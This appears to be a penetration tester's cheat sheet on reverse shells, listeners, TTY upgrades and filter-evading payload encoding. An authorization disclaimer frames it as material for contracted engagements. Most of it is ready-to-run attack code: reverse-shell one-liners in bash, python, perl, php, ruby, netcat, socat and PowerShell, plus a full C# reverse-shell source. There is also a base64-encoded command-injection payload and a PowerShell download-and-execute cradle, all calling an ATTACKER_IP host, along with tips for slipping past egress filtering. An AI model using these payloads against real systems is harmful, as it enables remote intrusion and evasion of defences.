# Moraa — Reverse Shells, TTY Upgrade, Listeners, Payload Encoding

> **AUTHORIZED ENGAGEMENTS ONLY — systems in scope.** These payloads are for pentest/CPTS-track
> work on hosts you are contractually authorized to control. In bug bounty, command-execution
> *proof* (`id`, `whoami`, one file read — see [[command-injection]] § "Confirm & escalate") is
> the finding; establishing a shell is out of scope without explicit program permission. Where a
> shell IS authorized, the flow is: proof → shell → TTY upgrade → pivot ([[pivoting]]) — see
> [[initial-access]] for the full landing sequence.

Set your variables once — every snippet below uses them:

```bash
ATTACKER_IP=10.10.14.2     # YOUR listener IP (tun0/VPN IP on the lab, not 127.0.0.1)
PORT=443                   # prefer 443 (blends with HTTPS egress) — see "firewall-aware" below
```

## 1. Listener FIRST — always before you fire the payload

```bash
# plain
nc -lvnp $PORT
# full arrow keys / history / Ctrl-C safety (never lose a shell to a stray Ctrl-C again):
rlwrap -cAr nc -lvnp $PORT
# fully interactive TTY on the attacker side (pairs with the socat payload in §2):
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:$PORT
# pwncat — auto TTY upgrade + logging + re-connect handling:
pwncat-cs -lp $PORT
# multiple/parallel shells: use a multi-handler (e.g. metasploit multi/handler) — one nc = one shell
```

## 2. One-liners per language/platform

```bash
# --- bash (uses /dev/tcp — a BASH feature; dash/sh on Debian/Ubuntu do NOT have it) ---
bash -c 'bash -i >& /dev/tcp/'$ATTACKER_IP'/'$PORT' 0>&1'
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1          # if already inside a bash context

# --- sh / POSIX (no /dev/tcp): fall back to nc ---
sh -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $PORT > /tmp/f"

# --- python3 ---
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$ATTACKER_IP'",$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
# note: the $PORT must be inlined numerically — write the real number into the quoted python code

# --- perl ---
perl -e 'use Socket;$i="'$ATTACKER_IP'";$p='$PORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# --- php ---
php -r '$sock=fsockopen("'$ATTACKER_IP'",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# --- ruby ---
ruby -rsocket -e 'f=TCPSocket.open("'$ATTACKER_IP'",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# --- netcat: WITH -e (GNU/ traditional nc, ncat) ---
nc -e /bin/bash $ATTACKER_IP $PORT
ncat $ATTACKER_IP $PORT -e /bin/bash
# --- netcat: WITHOUT -e (OpenBSD nc — the common one on modern Debian/Ubuntu) ---
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $PORT > /tmp/f

# --- socat (best quality shell on the victim side; pairs with the §1 socat listener) ---
socat exec:'bash -li,pty,stderr,setsid,sigint,sane' tcp:$ATTACKER_IP:$PORT

# --- powershell (Windows) — standard TCPClient read/eval loop ---
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# --- C# (compile on-box with the .NET compiler, then run) — save as rs.cs ---
cat > rs.cs <<'EOF'
using System;using System.Net.Sockets;using System.Text;using System.Diagnostics;
class RS { static void Main() {
  var c = new TcpClient("ATTACKER_IP", PORT);
  var s = c.GetStream(); var e = Encoding.ASCII;
  while (true) {
    var buf = new byte[1024]; int n = s.Read(buf, 0, 1024); if (n <= 0) break;
    var cmd = e.GetString(buf, 0, n).Trim();
    var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
      { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
    var p = Process.Start(psi); var outp = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    byte[] ob = e.GetBytes(outp); s.Write(ob, 0, ob.Length);
  }
} }
EOF
# victim (Windows, dev tools present):  csc.exe /out:rs.exe rs.cs && rs.exe
#   if csc is absent, prefer the powershell one-liner — no compilation needed.
```
Missed a language or need an exotic target (java, telnet, awk, golang)? The canonical public
catalog is PayloadsAllTheThings' reverse-shell cheatsheet — pull from it, don't improvise under
pressure.

## 3. TTY upgrade — the first thing you do with a Linux shell

Raw `nc` shells break on interactive commands (`su`, `ssh`, `vim`, Ctrl-C kills the shell).
Fix in 15 seconds:

```bash
# 1. inside the shell (python3 present — if not, use: script /dev/null -qc /bin/bash /dev/null):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. suspend it:  Ctrl-Z   (back in YOUR terminal:)
stty raw -echo; fg                # press Enter once — you're back in the victim shell, now with TTY
# 3. inside the shell again:
export TERM=xterm-256color
stty rows 40 cols 120             # match your own window: run `stty size` BEFORE Ctrl-Z
# now: tab completion works, `su` works, Ctrl-C kills the FOREGROUND process, not your shell
```
If you launched via the socat-on-both-sides pair (§1+§2), the shell is already fully interactive —
skip this section.

## 4. Encoding payloads past filters

```bash
# --- base64 the whole payload — beats keyword filters ("bash -i", "/bin/sh") in cmd-injection sinks ---
PAYLOAD='bash -i >& /dev/tcp/'$ATTACKER_IP'/'$PORT' 0>&1'
printf '%s' "$PAYLOAD" | base64 -w0; echo
# fire:  <sink>;echo <B64>|base64 -d|bash
# (see command-injection.md for the space/${IFS}/quote filter-bypass toolkit around it)

# --- URL-encoding — when the payload rides in a query param / form field ---
#   hand-encode the dangerous chars at minimum:  space=%20  &=%26  >=%3E  <=%3C  !=%21  '=%27  "=%22  #=%23
curl -s -G "https://TARGET/ping" --data-urlencode "host=127.0.0.1;${PAYLOAD}"

# --- PowerShell -enc (needs UTF-16LE base64, NOT plain base64) ---
PS='iex(New-Object Net.WebClient).DownloadString("http://'$ATTACKER_IP'/rs.ps1")'
ENC=$(printf '%s' "$PS" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)
# victim:  powershell -nop -enc <ENC>
```
Rule of thumb: filter met? change the ENCODING of the same payload, not the payload — and confirm
execution with the time-based / OOB checks in [[command-injection]] before assuming a block is a
non-execution.

## 5. Firewall-aware choices

- **Default: REVERSE shell on 443 or 80.** Victim connects OUT; you never depend on the target's
  inbound rules. Egress filtering usually permits 80/443 (web), 53 (DNS), sometimes 123 (NTP) —
  try those ports first, low port first.
- **Bind shell** only when you can route to the victim (internal hosts reached through a pivot,
  or a lab with inbound allowed) AND egress is fully blocked. `nc -lvnp $PORT -e /bin/bash` on the
  victim, connect from your side.
- **Neither direction works** → that's not a shell problem, that's a tunnel problem: ligolo-ng /
  chisel agent connecting out on an allowed port, then route through it — [[pivoting]].
- 443 with TLS (socat `OPENSSL-LISTEN`/`OPENSSL-CONNECT`, openssl s_server pairs) blends with
  normal HTTPS egress where plain-TCP 443 is inspected — authorized engagements only.

## 6. Cleanup (authorized engagements)

Record every listener port, every dropped file (rs.cs/rs.exe, /tmp/f fifos), every process you
spawned — and remove them at engagement end. [[initial-access]] §2 holds the placement/cleanup
discipline; `active-directory.md` § Persistence & cleanup exists for engagements that explicitly
authorize post-expiry access and is otherwise out of bounds.
